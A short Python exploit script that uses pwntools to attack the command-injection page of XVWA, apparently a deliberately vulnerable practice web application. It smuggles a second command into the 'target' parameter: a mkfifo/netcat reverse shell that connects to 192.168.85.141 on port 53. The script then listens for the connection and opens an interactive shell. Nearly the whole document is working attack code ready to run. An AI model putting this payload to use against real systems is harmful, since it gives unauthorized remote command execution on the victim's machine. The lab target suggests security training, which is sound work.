#!/usr/bin/python 
from pwn import *
import requests, urllib

url = "/xvwa/vulnerabilities/cmdi/?target="
cmdi = urllib.quote("127.0.0.1;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.85.141 53 >/tmp/f;")

shell = listen(53)
r = remote('xvwa', 80, ssl=False)
r.send('GET %s%s\r\n\r\n' % (url, cmdi))
r.close()

shell.wait_for_connection()
log.success("Got shell")
shell.interactive()
